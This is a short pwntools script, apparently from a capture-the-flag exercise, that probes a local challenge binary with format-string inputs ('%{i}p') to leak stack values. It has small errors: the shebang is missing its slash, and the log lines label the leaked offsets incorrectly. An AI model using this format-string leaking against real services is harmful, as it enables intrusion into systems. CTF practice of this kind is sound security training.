#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './pizza'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'
host, port = '', 1337


# =========================================================
#                           FUZZ
# =========================================================

flag = ''

for i in range(0, 100): # Range is obtained by fuzzing locally 
    io = process(exe)

    io.sendlineafter(b'> ', b'12')
    io.sendlineafter(b': ', f'%{i}p'.encode())

    io.sendlineafter(b'> ', b'12')
    io.sendlineafter(b': ', f'%{i + 3}p'.encode())
    
    io.sendlineafter(b'> ', b'12')
    io.sendlineafter(b': ', f'%{i + 5}p'.encode())
    io.recvuntil(b'chose:\n')
    leak1 = io.recvline().strip()
    leak2 = io.recvline().strip()
    leak3 = io.recvline().strip()
    log.info(f'Stack at {i}: {leak1}')
    log.info(f'Stack at {i + 1}: {leak2}')
    log.info(f'Stack at {i + 2}: {leak3}')
    io.close()